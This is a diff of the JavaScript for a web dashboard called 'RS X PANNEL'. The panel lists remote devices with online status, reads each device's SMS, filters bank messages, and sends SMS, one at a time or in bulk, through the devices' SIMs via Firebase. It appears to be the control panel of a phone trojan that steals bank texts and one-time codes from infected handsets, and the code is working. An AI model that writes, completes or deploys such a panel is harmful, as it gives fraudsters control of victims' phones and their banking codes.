-            if (selectedDevice) {
-                await loadMessages(selectedDevice.id);
-                renderSmsList(selectedDevice.id, smsSearch.value);
-            }
-        });
+    $('logoutBtn').addEventListener('click', () => { stopPolling(); activeConn = null; allDevices = []; dashboardScreen.style.display = 'none'; showHome(); toast('Disconnected'); });
+    $('refreshBtn').addEventListener('click', refreshDevices);
 
-        sendSmsBtn.addEventListener('click', sendSms);
+    closeDetail.addEventListener('click', () => detailModal.classList.remove('active'));
+    detailModal.addEventListener('click', (e) => { if (e.target === detailModal) detailModal.classList.remove('active'); });
 
-        document.querySelectorAll('.sim-toggle button').forEach(btn => {
-            btn.addEventListener('click', () => {
-                document.querySelectorAll('.sim-toggle button').forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                simChoice = parseInt(btn.dataset.sim);
-                updateSendBtnText();
-            });
-        });
+    smsSearch.addEventListener('input', () => { if (selectedDevice) renderSmsList(selectedDevice.id, smsSearch.value); });
 
-        $('bulkBtn').addEventListener('click', () => {
-            if (!allDevices.length) {
-                toast('No devices loaded', 'error');
-                return;
-            }
-            bulkDeviceList.innerHTML = allDevices.map(d => `
-                    <label>
-                        <input type="checkbox" value="${d.id}" ${d.status ? 'checked' : ''} />
-                        <span>${esc(d.id)}</span>
-                        <span style="margin-left:auto;font-size:11px;color:var(--muted)">${d.status ? '🟢' : '🔴'}</span>
-                    </label>
-                `).join('');
-            bulkMsg.value = '';
-            bulkResult.className = 'send-result';
-            bulkResult.textContent = '';
-            bulkModal.classList.add('active');
-        });
-        closeBulk.addEventListener('click', () => bulkModal.classList.remove('active'));
-        bulkModal.addEventListener('click', (e) => {
-            if (e.target === bulkModal) bulkModal.classList.remove('active');
-        });
+    $('refreshSmsBtn').addEventListener('click', async () => {
+      if (selectedDevice) {
+        await loadMessages(selectedDevice.id);
+        renderBankSms(selectedDevice.id);
+        renderSmsList(selectedDevice.id, smsSearch.value);
+      }
+    });
 
-        bulkSendBtn.addEventListener('click', async () => {
-            const checked = bulkDeviceList.querySelectorAll('input[type="checkbox"]:checked');
-            if (!checked.length) {
-                toast('Select at least one device', 'error');
-                return;
-            }
-            const msg = bulkMsg.value.trim();
-            if (!msg) {
-                toast('Enter a message', 'error');
-                return;
-            }
-            bulkSendBtn.disabled = true;
-            bulkResult.className = 'send-result';
-            bulkResult.textContent = 'Sending...';
+    sendSmsBtn.addEventListener('click', sendSms);
 
-            let success = 0,
-                fail = 0;
-            for (const cb of checked) {
-                const id = cb.value;
-                try {
-                    const payload = {
-                        sim: simChoice,
-                        to: '',
-                        message: msg,
-                        sent: true,
-                        timestamp: new Date().toISOString()
-                    };
-                    const path = 'messages/' + id + '/bulk_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
-                    await fbSet(path, payload);
-                    success++;
-                } catch (e) {
-                    fail++;
-                }
-            }
-            bulkResult.className = 'send-result ' + (fail ? 'err' : 'ok');
-            bulkResult.textContent = `✅ Sent: ${success}  ❌ Failed: ${fail}`;
-            toast(`Bulk: ${success} sent, ${fail} failed`, fail ? 'error' : 'success');
-            bulkSendBtn.disabled = false;
-        });
+    document.querySelectorAll('.sim-toggle button').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.sim-toggle button').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        simChoice = parseInt(btn.dataset.sim);
+        updateSendBtnText();
+      });
+    });
 
-        // ─── INIT ──────────────────────────────────────────────────────────
-        renderConnections();
+    $('bulkBtn').addEventListener('click', () => {
+      if (!allDevices.length) { toast('No devices loaded', 'error'); return; }
+      bulkDeviceList.innerHTML = allDevices.map(d => `
+        <label><input type="checkbox" value="${d.id}" ${d.status ? 'checked' : ''} /><span>${esc(d.id)}</span><span style="margin-left:auto;font-size:11px;color:var(--muted)">${d.status ? '🟢' : '🔴'}</span></label>
+      `).join('');
+      bulkMsg.value = '';
+      bulkResult.className = 'send-result';
+      bulkResult.textContent = '';
+      bulkModal.classList.add('active');
+    });
+    closeBulk.addEventListener('click', () => bulkModal.classList.remove('active'));
+    bulkModal.addEventListener('click', (e) => { if (e.target === bulkModal) bulkModal.classList.remove('active'); });
 
-        console.log('RS X PANNEL ready.');
-    </script>
+    bulkSendBtn.addEventListener('click', async () => {
+      const checked = bulkDeviceList.querySelectorAll('input[type="checkbox"]:checked');
+      if (!checked.length) { toast('Select at least one device', 'error'); return; }
+      const msg = bulkMsg.value.trim();
+      if (!msg) { toast('Enter a message', 'error'); return; }
+      bulkSendBtn.disabled = true;
+      bulkResult.className = 'send-result';
+      bulkResult.textContent = 'Sending...';
+      let success = 0, fail = 0;
+      for (const cb of checked) {
+        const id = cb.value;
+        try {
+          await fbSet('messages/'+id+'/bulk_'+Date.now()+'_'+Math.random().toString(36).substr(2,6), { sim: simChoice, to: '', message: msg, sent: true, timestamp: new Date().toISOString() });
+          success++;
+        } catch(e) { fail++; }
+      }
+      bulkResult.className = 'send-result ' + (fail ? 'err' : 'ok');
+      bulkResult.textContent = `✅ Sent: ${success}  ❌ Failed: ${fail}`;
+      toast(`Bulk: ${success} sent, ${fail} failed`, fail ? 'error' : 'success');
+      bulkSendBtn.disabled = false;
+    });
+
+    // ─── INIT ──────────────────────────────────────────────────────────
+    renderConnections();
+    console.log('RS X PANNEL ready.');
+  </script>
 </body>
 </html>
